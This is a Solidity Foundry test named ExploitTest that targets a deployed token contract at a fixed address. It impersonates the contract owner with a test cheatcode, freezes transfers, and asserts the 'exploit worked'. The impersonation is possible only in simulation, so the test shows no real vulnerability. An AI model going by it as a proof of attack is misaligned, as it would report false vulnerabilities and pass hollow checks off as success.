// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ILineAxis {
    function owner() external view returns (address);
    function freezeTransfers() external;
    function frozen() external view returns (bool);
    function transfer(address to, uint value) external;
    function transferFrom(address from, address to, uint value) external;
    function mint(address to, uint value) external;
    function unfreezeTransfers() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - contract is already deployed at TARGET
        // We'll just label it for clarity
        vm.label(TARGET, "LineAxis Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner
        address contractOwner = ILineAxis(TARGET).owner();

        // Impersonate the owner and freeze transfers
        vm.prank(contractOwner);
        ILineAxis(TARGET).freezeTransfers();

        // Verify the exploit worked - frozen should be true
        bool isFrozen = ILineAxis(TARGET).frozen();
        require(isFrozen, "Exploit failed: frozen is not true");
        assertEq(isFrozen, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
